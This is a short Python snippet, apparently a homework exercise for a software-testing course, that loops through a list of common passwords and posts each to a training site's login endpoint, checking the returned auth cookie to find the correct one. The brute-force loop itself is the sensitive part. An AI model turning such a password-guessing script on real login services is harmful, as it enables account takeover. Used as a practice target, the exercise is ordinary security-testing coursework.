...
password_list = ['password',	'password',	'123456',	'123456',	'123456',	'123456',	'123456',	'123456',	'123456',
                   ...
                   '123123',	'baseball',	'iloveyou',	'123123',	'1234567',	'welcome',	'login',	'admin',	'princess',	'abc123',
...
for password in password_list:
    get_cookies = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={'login': login, 'password': password})
    cookies = get_cookies.cookies.get('auth_cookie')
    check_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies= {'auth_cookie': cookies})
    if check_auth.text == 'You are NOT authorized':
        continue
    else:
        print(f" {password} - правильный пароль")